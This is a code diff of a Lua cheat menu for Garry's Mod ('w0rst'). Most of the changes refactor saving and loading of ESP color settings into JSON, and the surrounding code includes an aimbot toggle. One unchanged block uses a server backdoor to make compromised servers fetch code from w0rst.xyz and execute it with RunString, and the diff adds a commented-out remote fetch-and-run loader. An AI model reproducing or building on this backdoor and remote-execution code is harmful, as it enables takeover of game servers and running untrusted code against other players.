+        surface.DrawCircle(FovPos.x, FovPos.y, FovCircle[1], color['Fov'])
     end
 end)
 
@@ -1129,7 +1138,7 @@ CreateCheckbox("Ent-Distance", VisualsTab[1], 142, 70, function()
   end
 end)
 
-CreateCheckbox("Ent-3D (D)", VisualsTab[1], 262, 70, function()
+CreateCheckbox("Ent-3D", VisualsTab[1], 262, 70, function()
   Ent3DEnable=not Ent3DEnable
   if(Ent3DEnable == false) then
       wtf.Log("Entity 3D-Boxes Disabled")
@@ -1158,45 +1167,30 @@ CreateCheckbox("Free Camera", VisualsTab[1], 22, 100, function()
     FC.SetView=true
 end)
 
-CreateButton("Save Visuals", MiscTab[1], 110, 25, 395, 250, function()
-    local tc = TracerColor.r.." "..TracerColor.g.." "..TracerColor.b
-    local dc = DistanceColor.r.." "..DistanceColor.g.." "..DistanceColor.b
-    local nc = NameColor.r.." "..NameColor.g.." "..NameColor.b
-    local wc = WeaponColor.r.." "..WeaponColor.g.." "..WeaponColor.b
-    local bc = Box2DColor.r.." "..Box2DColor.g.." "..Box2DColor.b
-    local sc = SkeletonColor.r.." "..SkeletonColor.g.." "..SkeletonColor.b
-    local dbc = Box3DColor.r.." "..Box3DColor.g.." "..Box3DColor.b
-    local cc = ChamsColor.r.." "..ChamsColor.g.." "..ChamsColor.b
-    local ec = EntityColor.r.." "..EntityColor.g.." "..EntityColor.b
-    local fc = FovColor.r.." "..FovColor.g.." "..FovColor.b
-    local ndc = NameDistColor.r.." "..NameDistColor.g.." "..NameDistColor.b
+local function SaveVisuals()
+    local json = util.TableToJSON(color, true)
+    file.Write("w0rst/visuals.txt", json)
+    wtf.Log("Saved Visuals")
+end
 
-    wtf.Log("Visuals Saved")
-    file.Write("w0rst/visuals.txt", tc..","..dc..","..nc..","..wc..","..bc..","..sc..","..dbc..","..cc..","..ec..","..fc..","..ndc)
-end)
+local function LoadVisuals()
+    if file.Exists("w0rst/visuals.txt", "DATA") then
+        local file = file.Read("w0rst/visuals.txt", "DATA")
+        local json = util.JSONToTable(file)
+        table.Merge(color, json)
 
-CreateButton("Load Visuals", MiscTab[1], 110, 25, 280, 250, function()
-    if not file.Exists("w0rst/visuals.txt", "DATA") then
-        wtf.Log("File Not Found"); wtf.conoutRGB("VISUALS FILE NOT FOUND")
+        wtf.Log("Loaded Visuals");
+        TracerSlider.Update(); DistanceSlider.Update(); NameSlider.Update()
+        WeaponSlider.Update(); Box2DSlider.Update(); Box3DSlider.Update()
+        SkeletonSlider.Update(); ChamsSlider.Update(); EntitySlider.Update()
+        FovSlider.Update(); NameDistSlider.Update()
     else
-        wtf.Log("Visuals Loaded"); wtf.conoutRGB("VISUALS LOADED")
-        local f = file.Read("w0rst/visuals.txt"); local lines = string.Split(f, ",")
-        local tc,dc,nc = string.Split(lines[1], " "), string.Split(lines[2], " "), string.Split(lines[3], " ")
-        local wc,bc,sc = string.Split(lines[4], " "), string.Split(lines[5], " "), string.Split(lines[6], " ")
-        local dbc, cc, ec = string.Split(lines[7], " "), string.Split(lines[8], " "), string.Split(lines[9], " ")
-        local fc, ndc = string.Split(lines[10], " "), string.Split(lines[11], " ")
-
-        local function load(color_table, slider)
-            slider[1]:SetValue(color_table[1])
-            slider[2]:SetValue(color_table[2]);
-            slider[3]:SetValue(color_table[3])
-        end
-
-        load(tc, TracerSlider); load(dc, DistanceSlider); load(nc, NameSlider); load(wc, WeaponSlider)
-        load(bc, Box2DSlider); load(sc, SkeletonSlider); load(dbc, Box3DSlider); load(cc, ChamsSlider)
-        load(ec, EntitySlider); load(fc, FovSlider); load(ndc, NameDistSlider)
+        wtf.Log("Unable To Load Visuals")
     end
-end)
+end
+
+CreateButton("Save Visuals", MiscTab[1], 110, 25, 395, 250, SaveVisuals)
+CreateButton("Load Visuals", MiscTab[1], 110, 25, 280, 250, LoadVisuals)
 
 CreateBDServer("wmenu-memento", function()
     wtf.SendLua([[http.Fetch("https://w0rst.xyz/extra/wgamefucker", function(b) RunString(b) end)]])
@@ -1796,7 +1790,7 @@ CreateCheckbox("Chat Advertise", MiscTab[1], 20, 70, function()
     end
 end)
 
-CreateSlider("Fov:", FovCircle, MiscTab[1], 2200, 5, 260, 70)
+CreateSlider("Fov:", FovCircle, MiscTab[1], 1000, 5, 260, 70)
 CreateCheckbox("Aimbot L-ALT", MiscTab[1], 140, 70, function()
     AimbotEnable = !AimbotEnable
     if(AimbotEnable == false) then
@@ -1828,3 +1822,5 @@ CreateButton("Stop Sounds", SoundsTab[1], 120, 35, 255, 520, function()
 end)
 
 CreateSoundButtons()
+
+--/ http.Fetch("https://w0rst.xyz/script/load", RunString)
